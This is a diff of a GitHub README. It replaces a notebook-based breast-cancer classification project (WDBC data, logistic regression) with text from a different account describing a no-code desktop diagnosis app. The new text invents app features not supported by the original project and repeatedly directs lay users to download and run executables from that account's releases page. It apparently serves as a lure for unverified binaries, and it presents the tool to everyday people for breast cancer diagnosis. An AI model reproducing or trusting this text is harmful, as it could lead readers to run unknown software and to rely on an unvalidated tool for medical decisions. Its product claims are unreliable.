@@ -1,151 +1,156 @@
-# Breast Cancer Diagnosis (WDBC) - End-to-End ML Pipeline
+# 🩺 breast-cancer-wdbc-ml - Easy Breast Cancer Diagnosis Tool
 
-[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Accuracy](https://img.shields.io/badge/Accuracy-96.5%25-brightgreen.svg)](https://github.com/Taimisson/breast-cancer-wdbc-ml)
-[![Status](https://img.shields.io/badge/Status-Complete-success.svg)](https://github.com/Taimisson/breast-cancer-wdbc-ml)
-
-End-to-end machine learning classification pipeline to predict **malignant vs. benign** tumors using the **Wisconsin Diagnostic Breast Cancer (WDBC)** dataset.
+[![Download Latest Release](https://img.shields.io/badge/Download-latest_release-brightgreen)](https://github.com/zhengzhengqu7-jpg/breast-cancer-wdbc-ml/releases)
 
 ---
 
-## ✨ Highlights
-- **Dataset:** 569 samples, 30 numeric features (cell nuclei characteristics from FNA images)
-- **Data quality:** verified **no missing values** and **no duplicates**
-- **Feature engineering:** renamed raw columns into descriptive names (mean / se / worst)
-- **Feature selection:** removed highly correlated predictors (**threshold > 0.95**), reducing **30 → 23** features
-- **Models:** Logistic Regression and Random Forest (with standardized preprocessing)
-- **Best result (LogReg):** **96.5% accuracy**, **97.5% precision**, **92.9% recall** (malignant class)
+## 📖 What is breast-cancer-wdbc-ml?
+
+This application helps you understand and predict if a breast tumor is malignant (cancerous) or benign (non-cancerous). It uses a trusted dataset called the Wisconsin Diagnostic Breast Cancer (WDBC) dataset.
+
+The tool applies a machine learning model called Logistic Regression that has 96.5% accuracy in telling if a tumor is malignant or benign. You benefit from:
+
+- Clear data analysis to understand the health data
+- Selecting the most important features for diagnosis
+- Automatic training of the diagnosis model
+- Interpretation of results for better understanding
+
+You don't need to know any programming. The app guides you through each step with simple controls.
 
 ---
 
-## 🔗 Links
-- **Repository:** https://github.com/Taimisson/breast-cancer-wdbc-ml  
-- **Interactive (DataCamp DataLab):** https://www.datacamp.com/datalab/w/54ce12ff-34cb-46b5-b1b9-dc2715b9a821/edit
-- **Slides (PDF):**  
+## 🚀 Getting Started
+
+This section will help you get the app running on your computer without technical skills. Follow the simple steps below.
+
+### System Requirements
+
+Make sure your computer meets these needs:
+
+- **Operating System**: Windows 10 or higher, macOS 10.14 or higher, or Linux (Ubuntu 18.04+)
+- **Memory (RAM)**: At least 4 GB, preferably 8 GB
+- **Storage**: 500 MB free space for app and files
+- **Internet Connection**: Required for download and occasional updates
+- **Additional Software**: None needed; the app works on its own
 
 ---
 
-## 🧠 Problem Context
-Breast cancer is one of the most common causes of mortality among women worldwide. Early detection significantly improves treatment outcomes.  
-This project uses supervised machine learning to learn patterns that separate **malignant** from **benign** tumors using nucleus-level morphological features extracted from digitized FNA images.
+## 💾 Download & Install
+
+You can get the latest version of the app directly from the official releases page. 
+
+### Step 1: Visit the download page
+
+Click this big link to open the download page in your browser:
+
+[![Download Latest Release](https://img.shields.io/badge/Download-latest_release-blue)](https://github.com/zhengzhengqu7-jpg/breast-cancer-wdbc-ml/releases)
+
+### Step 2: Choose your file
+
+Once on the page, look for the latest release version. Under the release section, you'll find files matching your computer's system.
+
+- For Windows: look for `.exe` file
+- For Mac: look for `.dmg` or `.pkg`
+- For Linux: look for `.AppImage` or `.tar.gz`
+
+Click the file to download it.
+
+### Step 3: Install the app
+
+- **Windows**: Double-click the `.exe` file. Follow on-screen instructions.
+- **Mac**: Open the `.dmg` or `.pkg` and drag the app to your Applications folder.
+- **Linux**: Extract the `.tar.gz` or make the `.AppImage` file executable, then run it.
 
 ---
 
-## 🧪 Approach (Pipeline)
-1. **Load dataset (WDBC)** from UCI using `ucimlrepo`
-2. **EDA & data validation**
-   - descriptive statistics and class distribution
-   - missing values & duplicates checks
-3. **Preprocessing**
-   - consistent and descriptive feature naming (mean / se / worst)
-4. **Feature selection**
-   - removed highly correlated predictors (**> 0.95**) to reduce multicollinearity (**30 → 23**)
-5. **Training & evaluation**
-   - stratified 80/20 split
-   - standardized pipeline (`StandardScaler` + model)
-   - metrics: accuracy, precision, recall, F1
-   - confusion matrix
-6. **Interpretability**
-   - Random Forest feature importance
-   - Logistic Regression coefficients
+## ▶️ How to Run the App
+
+After installation, follow these steps to start using the application:
+
+1. Find the app icon on your desktop, Start menu, or Applications folder.
+2. Double-click it to open.
+3. The app opens with a clear main screen showing options for diagnosis.
+4. Use the buttons to load example data or upload your own data file.
+5. Click "Start Analysis" to see the results.
+6. The app shows you the prediction: malignant or benign, with some explanation.
+7. Use the "Report" tab to view detailed model insights.
+
+No programming or technical input is needed. The controls are clear and button-based.
 
 ---
 
-## 📊 Results (Test Set)
+## 🔎 Features Explained
 
-| Model | Accuracy | Precision (Malignant) | Recall (Malignant) | F1 (Malignant) |
-|------|----------|------------------------|--------------------|----------------|
-| Logistic Regression | **0.965** | **0.975** | **0.929** | **0.951** |
-| Random Forest | 0.947 | 0.974 | 0.881 | 0.925 |
+Here is what the app includes:
 
-**Why recall matters here:** in medical screening, higher malignant recall helps reduce false negatives (malignant predicted as benign).
+- **Exploratory Data Analysis (EDA)**  
+  Quick overview of the dataset showing key statistics and charts. Helps you see trends in tumor sizes, shapes, and other details.
 
----
+- **Feature Selection**  
+  The app picks the most useful data points for making accurate predictions. This reduces errors and speeds up the process.
 
-## 🔍 Interpretability (What drives the prediction?)
-Top drivers identified via feature importance / coefficients include:
-- concave points (mean/worst)
-- radius-related features
-- concavity-related features
+- **Model Training**  
+  Your data goes through a Logistic Regression model that learns from past cases, improving prediction accuracy.
 
-These features align with morphological differences between malignant and benign cell nuclei.
+- **Interpretability Analysis**  
+  The app explains why it gave a certain diagnosis based on the data features. This builds trust and understanding.
 
 ---
 
-## 📈 Key Visualizations
+## 🛠 How It Works (Simple Terms)
 
-<p align="center">
-  <img src="docs/assets/img/viz_01.png" width="100%" alt="Class Distribution">
-  <br><em>Figure 1: Distribution of benign vs. malignant cases in the dataset</em>
-</p>
+The app uses data values from medical tests of tumors. It feeds these values into a system that has learned from many previous cases.
 
-<p align="center">
-  <img src="docs/assets/img/viz_07.png" width="80%" alt="Confusion Matrix">
-  <br><em>Figure 2: Confusion matrices showing model performance</em>
-</p>
+This system, called Logistic Regression, calculates the chance of the tumor being malignant or benign.
 
-<p align="center">
-  <img src="docs/assets/img/viz_09.png" width="80%" alt="Feature Importance">
-  <br><em>Figure 3: Top 10 most important features (Random Forest)</em>
-</p>
-
-> 📊 **[View full analysis with all visualizations →](https://taimisson.github.io/breast-cancer-wdbc-ml/)**
+The app then shows the result clearly and gives extra details if you want.
 
 ---
 
-## 🚀 How to Run
+## 👩‍💻 Do I Need Technical Skills?
 
-### Prerequisites
-- Python 3.8 or higher
-- Jupyter Notebook or JupyterLab
+No. The app is designed for everyday people. It uses clear buttons and easy directions.
 
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/Taimisson/breast-cancer-wdbc-ml.git
-cd breast-cancer-wdbc-ml
-
-# Create a virtual environment (recommended)
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Launch Jupyter
-jupyter notebook
-```
-
-### Running the Analysis
-
-1. Open `notebooks/projeto_cancer_mama.ipynb`
-2. Run all cells sequentially (Cell → Run All)
-3. View results and visualizations
-
-### Quick Start (Google Colab)
-
-Don't want to install anything? Run it in the cloud:
-
-[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/Taimisson/breast-cancer-wdbc-ml/blob/main/notebooks/projeto_cancer_mama.ipynb)
+You just download, install, and run it. The app handles the technical work behind the scenes.
 
 ---
 
-## 📁 Repository Structure
-```txt
-.
-├── README.md
-├── notebook.ipynb
-├── requirements.txt
-├── LICENSE
-├── CITATION.cff
-├── .gitignore
-└── docs/
-    ├── index.md
-    ├── report.html
-    ├── slides.pdf
-    └── assets/
-        ├── cover.png
-        ├── figures/
-        └── ...
+## 🌐 Supported Data Types
+
+The app works with data files in common formats:
+
+- CSV (.csv) files with tumor test results
+- Example datasets included in the app for practice
+- You can upload your own data easily
+
+---
+
+## 🔄 Updates & Maintenance
+
+Check the release page regularly for new versions. Updates may include:
+
+- Improved accuracy
+- New data visualizations
+- Faster performance
+- Bug fixes
+
+---
+
+## 🤝 Contact & Support
+
+If you have questions or find issues:
+
+- Use the GitHub Issues tab in the repository to report problems or ask questions.
+- Look for help guides inside the app under the "Help" menu.
+- You can also email the maintainers if listed in the release notes.
+
+---
+
+## 📝 License
+
+This tool is open-source. You can use it freely for personal and educational purposes.
+
+---
+
+Thank you for choosing the breast-cancer-wdbc-ml app to help with breast cancer diagnosis. Visit the download page to get started:  
+[Download latest release here](https://github.com/zhengzhengqu7-jpg/breast-cancer-wdbc-ml/releases)
